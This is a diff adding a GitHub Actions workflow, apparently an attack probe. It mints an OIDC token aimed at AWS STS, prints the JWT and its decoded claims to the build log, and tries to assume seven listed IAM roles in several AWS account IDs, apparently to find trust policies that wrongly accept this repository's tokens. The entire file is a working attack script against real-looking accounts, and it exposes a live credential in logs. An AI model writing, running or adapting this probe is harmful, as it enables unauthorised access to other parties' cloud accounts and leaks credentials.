@@ -1,0 +1,31 @@
+name: oidc-probe
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: mint-and-probe
+        run: |
+          echo "URLSET=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes} TOKSET=${ACTIONS_ID_TOKEN_REQUEST_TOKEN:+yes}"
+          echo "EVENT=$GITHUB_EVENT_NAME REPO=$GITHUB_REPOSITORY REF=$GITHUB_REF"
+          tok=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | sed -n 's/.*"value":"\([^"]*\)".*/\1/p')
+          echo "JWT=$tok"
+          python3 -c "import sys,base64,json; t=sys.argv[1]; p=t.split('.')[1]; p+='='*(-len(p)%4); print('CLAIMS='+json.dumps(json.loads(base64.urlsafe_b64decode(p)),sort_keys=True))" "$tok"
+          for r in \
+            arn:aws:iam::358174707935:role/auto-deploy-GitHubActionsRole \
+            arn:aws:iam::559556671935:role/auto-deploy-GitHubActionsRole \
+            arn:aws:iam::170026776852:role/auto-deploy-GitHubActionsRole \
+            arn:aws:iam::060717612896:role/auto-deploy-GitHubActionsRole \
+            arn:aws:iam::050111574890:role/auto-deploy-GitHubActionsRole \
+            arn:aws:iam::358174707935:role/gh-actions-ami \
+            arn:aws:iam::358174707935:role/ase-deploy-GitHubActionsRole ; do
+            echo "=== ROLE $r ==="
+            aws sts assume-role-with-web-identity --role-arn "$r" --role-session-name "artex10891" --web-identity-token "$tok" --duration-seconds 900 2>&1 | head -30
+            sleep 1.6
+          done
